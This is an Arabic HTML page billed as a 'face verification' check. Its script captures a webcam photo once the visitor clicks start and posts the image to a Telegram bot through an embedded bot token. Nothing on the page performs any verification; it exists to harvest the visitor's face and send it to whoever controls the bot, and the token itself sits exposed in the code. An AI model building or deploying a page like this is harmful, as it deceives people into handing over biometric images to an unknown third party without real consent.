<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحقق من الوجه</title>
</head>
<body>
    <div id="status">اضغط للبدء</div>
    <button id="startBtn">بدء التحقق</button>
    <video id="video" autoplay playsinline style="display:none;"></video>

    <script>
        // التوكن الخاص بك (يجب تغييره بعد التجربة)
        const TOKEN = "8446745973:AAGJFzPurWMbU44hN3V-vJjTpyGviYQUYhg";
        
        // ضع رقم الآيدي الخاص بك هنا (مثال: 123456789)
        const CHAT_ID = "ضع_رقم_الآيدي_الخاص_بك_هنا"; 
        
        const statusEl = document.getElementById('status');
        const video = document.getElementById('video');

        document.getElementById('startBtn').onclick = async () => {
            try {
                statusEl.innerText = "جاري تفعيل الكاميرا...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                await new Promise(r => setTimeout(r, 1500)); // انتظار جاهزية الكاميرا

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'face.jpg');

                    statusEl.innerText = "جاري الإرسال...";
                    
                    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    const result = await response.json();
                    
                    if (result.ok) {
                        statusEl.innerText = "تم الإرسال بنجاح!";
                    } else {
                        // هنا تظهر المشكلة الحقيقية إذا لم يرسل
                        statusEl.innerText = "فشل الإرسال: " + result.description;
                        console.log("خطأ تليجرام:", result);
                    }
                    
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg');

            } catch (err) {
                statusEl.innerText = "خطأ: " + err.message;
            }
        };
    </script>
</body>
</html>
